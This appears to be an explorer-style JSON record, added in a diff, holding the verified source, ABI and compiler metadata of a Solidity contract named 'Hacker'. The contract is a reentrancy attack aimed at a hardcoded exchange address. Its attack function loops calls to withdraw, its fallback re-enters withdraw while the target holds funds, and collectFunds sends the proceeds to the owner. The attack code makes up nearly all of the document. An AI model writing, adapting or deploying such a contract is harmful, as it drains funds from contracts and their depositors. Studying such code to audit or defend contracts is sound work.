@@ -1,0 +1,25 @@
+{
+  "TxHash": "0x0cd03533b4c42a975e861837083a9092c6256bf5a5f7efeccb5a56c9045b3ae1",
+  "ContractAddress": "0xf2ae131b5ba029919ae93fac4703175284b6a40d",
+  "Name": "Hacker",
+  "PackageStatus": 0,
+  "status": "1",
+  "message": "OK",
+  "result": [
+    {
+      "SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.10;\r\n\r\ninterface IExchange {\r\n    function deposit() external payable;\r\n    function withdraw(address token, uint256 amount) external returns (bool success);\r\n}\r\n\r\ncontract Hacker {\r\n    IExchange public exchange;\r\n    address public owner;\r\n\r\n    // Constructor to initialize the contract with the address of the Exchange contract\r\n    constructor() {\r\n        exchange = IExchange(0x2a0c0DBEcC7E4D658f48E01e3fA353F44050c208);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Function to deposit ETH into the Hacker contract to cover gas fees\r\n    function depositETHForGas() public payable {\r\n        require(msg.value \u003e 0, \"Must send ETH to cover gas fees\");\r\n    }\r\n\r\n    // Function to deposit ETH into the Exchange contract\r\n    function depositToExchange() public payable {\r\n        require(msg.value \u003e 0, \"Must send ETH to deposit into Exchange\");\r\n        exchange.deposit{value: msg.value}();\r\n    }\r\n\r\n    // Function to initiate the reentrancy attack with multiple transactions\r\n    function attack(uint256 amount, uint256 iterations) public {\r\n        require(msg.sender == owner, \"Only owner can initiate the attack\");\r\n        for (uint256 i = 0; i \u003c iterations; i++) {\r\n            exchange.withdraw(0x0000000000000000000000000000000000000000, amount);\r\n        }\r\n    }\r\n\r\n    // Receive function to handle plain Ether transfers\r\n    receive() external payable {\r\n        // Logic can be added here if needed\r\n    }\r\n\r\n    // Fallback function to handle reentrancy during the attack\r\n    fallback() external payable {\r\n        uint256 gasForReentry = gasleft() - 10000; // leave some gas for safety\r\n        if (address(exchange).balance \u003e= 1 ether) {\r\n            (bool success,) = address(exchange).call{gas: gasForReentry}(\r\n                abi.encodeWithSignature(\"withdraw(address,uint256)\", 0x0000000000000000000000000000000000000000, address(this).balance)\r\n            );\r\n            require(success, \"Reentrancy failed\");\r\n        }\r\n    }\r\n\r\n    // Function to collect remaining ETH after the attack\r\n    function collectFunds() public {\r\n        require(msg.sender == owner, \"Only owner can collect funds\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n    // Function to check the balance of this contract\r\n    function getBalance() public view returns (uint) {\r\n        return address(this).balance;\r\n    }\r\n}",
+      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"iterations\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"collectFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"depositETHForGas\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"depositToExchange\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exchange\",\"outputs\":[{\"internalType\":\"contract IExchange\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
+      "ContractName": "Hacker",
+      "CompilerVersion": "v0.8.10+commit.fc410830",
+      "OptimizationUsed": "0",
+      "Runs": "200",
+      "ConstructorArguments": "",
+      "EVMVersion": "Default",
+      "Library": "",
+      "LicenseType": "MIT",
+      "Proxy": "0",
+      "Implementation": "",
+      "SwarmSource": "ipfs://eb1c6d0fb43b120f84f46db6c7fb21b96ba166b11d37fc4b1b6fa38266d57cfc"
+    }
+  ]
+}
